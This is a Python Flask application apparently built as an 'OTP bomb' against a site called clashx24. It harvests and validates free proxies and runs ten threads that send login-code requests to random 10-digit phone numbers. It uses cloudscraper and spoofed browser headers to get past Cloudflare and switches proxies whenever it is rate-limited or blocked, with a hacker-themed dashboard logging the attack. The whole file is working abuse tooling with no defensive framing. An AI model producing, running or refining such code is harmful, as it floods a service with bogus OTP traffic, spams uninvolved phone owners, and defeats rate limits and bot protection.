import os
import time
import random
import json
import threading
import requests
import cloudscraper
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, jsonify, render_template_string, Response

app = Flask(__name__)

# --- GLOBAL STATE ---
STATE = {
    "start_time": time.time(),
    "start_time_str": datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
    "code_200": 0,
    "code_201": 0,
    "code_400": 0,
    "code_403": 0,
    "code_other": 0,
    "proxies_fetched": 0,
    "proxies_dead": 0,
    "proxies_live": 0,
    "total_attempts": 0,
    "logs": []
}

PROXIES_LIVE_QUEUE = []
BG_THREADS_STARTED = False
LOG_LOCK = threading.Lock()

# --- LOGGING SYSTEM ---
def log_sys(msg, level="info", target="N/A", proxy="N/A"):
    """Thread-safe logging system that pushes data to the UI."""
    with LOG_LOCK:
        entry = {
            "time": datetime.now().strftime("%H:%M:%S"),
            "message": msg,
            "level": level,
            "target": target,
            "proxy": proxy
        }
        STATE["logs"].insert(0, entry)
        # Cap memory usage for Render's free tier
        if len(STATE["logs"]) > 2000:
            STATE["logs"] = STATE["logs"][:2000]

# --- MULTIPLE PROXY FETCHERS ---
def fetch_raw_proxies():
    """Fetches free proxies from 4 different global sources."""
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
    ]
    
    raw_proxies = set()
    log_sys("SYSTEM: Reaching out to 4 global proxy APIs...", "info")
    
    for url in sources:
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                lines = resp.text.strip().split('\n')
                for line in lines:
                    proxy = line.strip()
                    if ":" in proxy:
                        raw_proxies.add(proxy)
        except Exception as e:
            log_sys(f"SYSTEM: Failed to fetch from {url} - {str(e)}", "warn")

    proxy_list = list(raw_proxies)
    random.shuffle(proxy_list)
    return proxy_list[:500] # Take exactly 500 random proxies

def check_single_proxy(proxy):
    """Pings a lightweight endpoint to check if the proxy is actually alive."""
    proxies = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }
    try:
        # Generate 204 is a fast, empty response from Google used for connectivity checks
        res = requests.get("http://connectivitycheck.gstatic.com/generate_204", proxies=proxies, timeout=5)
        if res.status_code == 204:
            PROXIES_LIVE_QUEUE.append(proxy)
            STATE["proxies_live"] += 1
            log_sys(f"VALIDATED: Proxy is ALIVE and added to queue.", "success", proxy=proxy)
        else:
            STATE["proxies_dead"] += 1
    except:
        STATE["proxies_dead"] += 1

def proxy_manager_thread():
    """Background thread that ensures the live proxy queue never runs dry."""
    while True:
        if len(PROXIES_LIVE_QUEUE) < 20:
            log_sys(f"SYSTEM: Live proxy queue low ({len(PROXIES_LIVE_QUEUE)}). Fetching 500 new proxies...", "info")
            new_proxies = fetch_raw_proxies()
            STATE["proxies_fetched"] += len(new_proxies)
            
            log_sys(f"SYSTEM: Downloaded {len(new_proxies)} raw proxies. Spawning 50 threads to verify...", "info")
            
            # Use 50 threads to quickly check all 500 proxies
            with ThreadPoolExecutor(max_workers=50) as executor:
                executor.map(check_single_proxy, new_proxies)
                
            log_sys(f"SYSTEM: Verification complete. Total Live Queue: {len(PROXIES_LIVE_QUEUE)}", "success")
        
        time.sleep(5)

# --- OTP WORKER LOGIC (Updated with Cloudflare bypass) ---
def otp_worker_thread(worker_id):
    """Worker thread that grabs a proxy and sends OTPs until proxy is blocked."""
    while True:
        if not PROXIES_LIVE_QUEUE:
            time.sleep(2)
            continue
            
        # 1. Grab a guaranteed live proxy
        current_proxy = PROXIES_LIVE_QUEUE.pop(0)
        STATE["proxies_live"] = len(PROXIES_LIVE_QUEUE)
        log_sys(f"[THREAD-{worker_id}] Acquired live proxy. Engaging target loop.", "info", proxy=current_proxy)
        
        proxy_dict = {
            "http": f"http://{current_proxy}",
            "https": f"http://{current_proxy}"
        }

        # Create cloudscraper instance for this proxy with browser emulation
        try:
            scraper = cloudscraper.create_scraper(
                browser={
                    'browser': 'chrome',
                    'platform': 'windows',
                    'mobile': False,
                    'desktop': True
                },
                delay=15,
                interpreter='native'
            )
            log_sys(f"[THREAD-{worker_id}] Cloudscraper initialized successfully.", "info", proxy=current_proxy)
        except Exception as e:
            log_sys(f"[THREAD-{worker_id}] Cloudscraper init failed: {str(e)}. Falling back to requests.", "warn", proxy=current_proxy)
            scraper = requests.Session()

        # 2. Loop on this specific proxy until it gets blocked
        while True:
            # Generate 10-digit phone number (must start with 6,7,8,9)
            phone = random.choice("6789") + "".join(random.choices("0123456789", k=9))
            
            # API Endpoint
            send_otp_url = "https://api.clashx24.xyz/user/login-code"
            
            # Enhanced headers for Cloudflare bypass
            headers = {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "accept-language": "en-US,en;q=0.9",
                "accept-encoding": "gzip, deflate, br",
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "origin": "https://clashx24.xyz",
                "referer": "https://clashx24.xyz/",
                "cache-control": "no-cache",
                "pragma": "no-cache"
            }
            
            send_payload = {"phone_number": phone}

            STATE["total_attempts"] += 1
            log_sys(f"[THREAD-{worker_id}] Sending OTP to: {phone}", "info", target=phone, proxy=current_proxy)

            try:
                # 3. Send OTP request using cloudscraper
                send_res = scraper.post(
                    send_otp_url, 
                    json=send_payload, 
                    headers=headers, 
                    proxies=proxy_dict, 
                    timeout=15
                )
                
                # 4. Handle Server Response
                if send_res.status_code == 200 or send_res.status_code == 201:
                    if send_res.status_code == 200:
                        STATE["code_200"] += 1
                    else:
                        STATE["code_201"] += 1
                    
                    # Try to parse JSON response for better logging
                    try:
                        response_json = send_res.json()
                        log_sys(f"[THREAD-{worker_id}] ✅ OTP SENT SUCCESSFULLY! Status: {send_res.status_code}", "success", target=phone, proxy=current_proxy)
                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {json.dumps(response_json, indent=4)[:200]}...", "info", target=phone, proxy=current_proxy)
                    except ValueError:
                        log_sys(f"[THREAD-{worker_id}] ✅ OTP SENT SUCCESSFULLY! Status: {send_res.status_code}", "success", target=phone, proxy=current_proxy)
                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {send_res.text[:200]}...", "info", target=phone, proxy=current_proxy)
                    
                    # Wait before sending next OTP (avoid rate limiting)
                    time.sleep(random.uniform(0.5, 1.5))
                    continue  # Keep using same proxy
                    
                elif send_res.status_code == 400:
                    STATE["code_400"] += 1
                    log_sys(f"[THREAD-{worker_id}] ❌ STATUS 400: Rate limited or invalid request. Burning proxy.", "error", target=phone, proxy=current_proxy)
                    try:
                        response_json = send_res.json()
                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {json.dumps(response_json, indent=4)}", "error", target=phone, proxy=current_proxy)
                    except ValueError:
                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {send_res.text[:200]}", "error", target=phone, proxy=current_proxy)
                    break  # Burn this proxy, get a new one
                    
                elif send_res.status_code == 403:
                    STATE["code_403"] += 1
                    log_sys(f"[THREAD-{worker_id}] 🛡️ STATUS 403: Cloudflare blocking this proxy. Burning.", "error", target=phone, proxy=current_proxy)
                    try:
                        response_json = send_res.json()
                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {json.dumps(response_json, indent=4)}", "error", target=phone, proxy=current_proxy)
                    except ValueError:
                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {send_res.text[:200]}", "error", target=phone, proxy=current_proxy)
                    break  # Burn this proxy, get a new one
                    
                else:
                    STATE["code_other"] += 1
                    log_sys(f"[THREAD-{worker_id}] ⚠️ UNKNOWN STATUS {send_res.status_code}. Burning proxy.", "warn", target=phone, proxy=current_proxy)
                    try:
                        response_json = send_res.json()
                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {json.dumps(response_json, indent=4)}", "warn", target=phone, proxy=current_proxy)
                    except ValueError:
                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {send_res.text[:200]}", "warn", target=phone, proxy=current_proxy)
                    break  # Burn this proxy, get a new one

            except cloudscraper.exceptions.CloudflareChallengeError as cf_error:
                STATE["code_403"] += 1
                log_sys(f"[THREAD-{worker_id}] 🛡️ CLOUDFLARE CHALLENGE FAILED: {str(cf_error)[:100]}. Burning proxy.", "error", target=phone, proxy=current_proxy)
                break
                
            except requests.exceptions.Timeout:
                log_sys(f"[THREAD-{worker_id}] ⏱️ TIMEOUT: Proxy slow/disconnected. Burning.", "error", target=phone, proxy=current_proxy)
                break  # Burn this proxy, get a new one
                
            except requests.exceptions.ConnectionError:
                log_sys(f"[THREAD-{worker_id}] 🔌 CONNECTION ERROR: Proxy refused. Burning.", "error", target=phone, proxy=current_proxy)
                break  # Burn this proxy, get a new one
                
            except Exception as e:
                log_sys(f"[THREAD-{worker_id}] 💥 UNKNOWN ERROR: {str(e)[:100]}. Burning proxy.", "error", target=phone, proxy=current_proxy)
                break  # Burn this proxy, get a new one

# --- FLASK SERVER & BOOTSTRAP ---
def init_background_threads():
    global BG_THREADS_STARTED
    if not BG_THREADS_STARTED:
        log_sys("SYSTEM: Initializing background routing threads...", "info")
        
        # Start Proxy Manager
        threading.Thread(target=proxy_manager_thread, daemon=True).start()
        
        # Start 10 Simultaneous OTP Workers
        for i in range(1, 11):
            threading.Thread(target=otp_worker_thread, args=(i,), daemon=True).start()
            
        BG_THREADS_STARTED = True

@app.before_request
def activate_threads():
    # Ensures threads start safely inside Render's Gunicorn workers
    init_background_threads()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/stats')
def stats():
    uptime_seconds = int(time.time() - STATE["start_time"])
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return jsonify({
        "uptime": f"{hours:02d}h {minutes:02d}m {seconds:02d}s",
        "started_at": STATE["start_time_str"],
        "code_200": STATE["code_200"],
        "code_201": STATE["code_201"],
        "code_400": STATE["code_400"],
        "code_403": STATE["code_403"],
        "code_other": STATE["code_other"],
        "total_attempts": STATE["total_attempts"],
        "proxies_fetched": STATE["proxies_fetched"],
        "proxies_dead": STATE["proxies_dead"],
        "proxies_live_queue": len(PROXIES_LIVE_QUEUE),
        "logs": STATE["logs"][:80] # Send latest 80 logs to UI
    })

@app.route('/api/export')
def export_data():
    def generate():
        yield json.dumps({
            "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "statistics": {
                "total_200": STATE["code_200"],
                "total_201": STATE["code_201"],
                "total_400": STATE["code_400"],
                "total_403": STATE["code_403"],
                "total_other": STATE["code_other"],
                "total_attempts": STATE["total_attempts"],
                "proxies_fetched": STATE["proxies_fetched"],
                "proxies_dead": STATE["proxies_dead"]
            },
            "activity_logs": STATE["logs"]
        }, indent=4)
    return Response(generate(), mimetype='application/json', headers={'Content-Disposition': 'attachment;filename=clashx24_attack_logs.json'})

# --- UI TEMPLATE (Cyber Hacker Vibe - ClashX24 Edition) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYS.TERMINAL // CLASHX24-OTP BOMB</title>
    <style>
        body {
            background-color: #050505;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 20px;
        }
        h1 {
            text-align: center;
            text-shadow: 0 0 10px #00ff00;
            border-bottom: 1px solid #00ff00;
            padding-bottom: 10px;
            letter-spacing: 2px;
        }
        .header-info {
            text-align: center;
            margin-bottom: 20px;
            color: #00ffff;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .stat-box {
            border: 1px solid #00ff00;
            padding: 15px;
            text-align: center;
            background: rgba(0, 255, 0, 0.03);
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
        }
        .stat-value {
            font-size: 26px;
            font-weight: bold;
            margin-top: 10px;
            text-shadow: 0 0 5px #00ff00;
        }
        .box-red { border-color: #ff3333; color: #ff3333; box-shadow: 0 0 10px rgba(255, 51, 51, 0.2); }
        .box-red .stat-value { text-shadow: 0 0 5px #ff3333; }
        
        .box-cyan { border-color: #00ffff; color: #00ffff; box-shadow: 0 0 10px rgba(0, 255, 255, 0.2); }
        .box-cyan .stat-value { text-shadow: 0 0 5px #00ffff; }

        .box-gray { border-color: #888; color: #888; box-shadow: 0 0 10px rgba(136, 136, 136, 0.2); }
        .box-gray .stat-value { text-shadow: 0 0 5px #888; }

        .box-gold { border-color: #ffd700; color: #ffd700; box-shadow: 0 0 10px rgba(255, 215, 0, 0.2); }
        .box-gold .stat-value { text-shadow: 0 0 5px #ffd700; }

        .box-green { border-color: #00ff00; color: #00ff00; box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); }
        .box-green .stat-value { text-shadow: 0 0 5px #00ff00; }
        
        .box-purple { border-color: #9b59b6; color: #9b59b6; box-shadow: 0 0 10px rgba(155, 89, 182, 0.2); }
        .box-purple .stat-value { text-shadow: 0 0 5px #9b59b6; }

        .terminal-container {
            margin-top: 20px;
            background: #000;
            border: 1px solid #00ff00;
            box-shadow: inset 0 0 20px rgba(0,255,0,0.2);
            padding: 15px;
            height: 500px;
            overflow-y: auto;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #003300;
            font-size: 13px;
        }
        th {
            background: #002200;
            position: sticky;
            top: 0;
            color: #fff;
        }
        .level-system { color: #00ffff; }
        .level-success { color: #00ff00; }
        .level-error { color: #ff3333; }
        .level-warn { color: #ffcc00; }
        .level-info { color: #aaaaaa; }
        
        .btn-export {
            display: block;
            width: 100%;
            padding: 15px;
            background: #002200;
            color: #00ff00;
            border: 1px solid #00ff00;
            font-family: 'Courier New', Courier, monospace;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            transition: 0.3s;
            box-sizing: border-box;
            margin-top: 20px;
        }
        .btn-export:hover {
            background: #00ff00;
            color: #000;
            box-shadow: 0 0 15px #00ff00;
        }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #050505; border-left: 1px solid #00ff00; }
        ::-webkit-scrollbar-thumb { background: #00ff00; }
        
        .blink {
            animation: blink 1s step-end infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        
        .clashx24-badge {
            color: #ffd700;
            border: 1px solid #ffd700;
            padding: 2px 10px;
            border-radius: 3px;
            font-size: 12px;
            display: inline-block;
            margin-left: 10px;
        }
    </style>
</head>
<body>

    <h1>[ SYS.TERMINAL // CLASHX24-OTP ROUTER ] <span class="clashx24-badge">v2.0</span></h1>
    <div class="header-info">
        <span class="blink">▶</span> SERVER STARTED: <span id="val_started">--</span> | UPTIME: <span id="val_uptime">--</span> | ATTEMPTS: <span id="val_attempts">0</span>
    </div>

    <div class="stats-grid">
        <div class="stat-box box-cyan">
            <div>PROXIES FETCHED</div>
            <div class="stat-value" id="val_fetched">0</div>
        </div>
        <div class="stat-box box-green">
            <div>PROXIES LIVE</div>
            <div class="stat-value" id="val_live">0</div>
        </div>
        <div class="stat-box box-gray">
            <div>PROXIES DEAD</div>
            <div class="stat-value" id="val_dead">0</div>
        </div>
        <div class="stat-box box-gold">
            <div>STATUS 200</div>
            <div class="stat-value" id="val_200">0</div>
        </div>
        <div class="stat-box box-gold">
            <div>STATUS 201</div>
            <div class="stat-value" id="val_201">0</div>
        </div>
        <div class="stat-box box-red">
            <div>STATUS 400</div>
            <div class="stat-value" id="val_400">0</div>
        </div>
        <div class="stat-box box-purple">
            <div>STATUS 403</div>
            <div class="stat-value" id="val_403">0</div>
        </div>
        <div class="stat-box">
            <div>OTHER STATUS</div>
            <div class="stat-value" id="val_other">0</div>
        </div>
    </div>

    <a href="/api/export" target="_blank" class="btn-export">>> EXPORT FULL TRAFFIC HISTORY (.JSON) <<</a>

    <div class="terminal-container">
        <table>
            <thead>
                <tr>
                    <th width="10%">TIME</th>
                    <th width="45%">EVENT LOG</th>
                    <th width="20%">TARGET (PHONE)</th>
                    <th width="25%">ROUTED PROXY</th>
                </tr>
            </thead>
            <tbody id="log_body">
                <tr><td colspan="4">Initializing system... Please refresh the page if logs do not appear.</td></tr>
            </tbody>
        </table>
    </div>

    <script>
        function fetchStats() {
            fetch('/api/stats')
                .then(res => res.json())
                .then(data => {
                    document.getElementById('val_uptime').innerText = data.uptime;
                    document.getElementById('val_started').innerText = data.started_at;
                    document.getElementById('val_attempts').innerText = data.total_attempts;
                    document.getElementById('val_fetched').innerText = data.proxies_fetched;
                    document.getElementById('val_live').innerText = data.proxies_live_queue;
                    document.getElementById('val_dead').innerText = data.proxies_dead;
                    document.getElementById('val_200').innerText = data.code_200;
                    document.getElementById('val_201').innerText = data.code_201;
                    document.getElementById('val_400').innerText = data.code_400;
                    document.getElementById('val_403').innerText = data.code_403;
                    document.getElementById('val_other').innerText = data.code_other;

                    const tbody = document.getElementById('log_body');
                    tbody.innerHTML = ''; 
                    
                    data.logs.forEach(log => {
                        const tr = document.createElement('tr');
                        tr.className = `level-${log.level}`;
                        tr.innerHTML = `
                            <td>${log.time}</td>
                            <td>${log.message}</td>
                            <td>${log.target}</td>
                            <td>${log.proxy}</td>
                        `;
                        tbody.appendChild(tr);
                    });
                })
                .catch(err => console.error("Sync Error:", err));
        }

        // Poll API every 1.5 seconds
        setInterval(fetchStats, 1500);
        
        // Initial Fetch
        setTimeout(fetchStats, 500);
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    # Flask app runs on the assigned port
    port = int(os.environ.get('PORT', 5000))
    # We trigger the threads BEFORE running the app to ensure they start immediately
    init_background_threads()
    app.run(host='0.0.0.0', port=port)
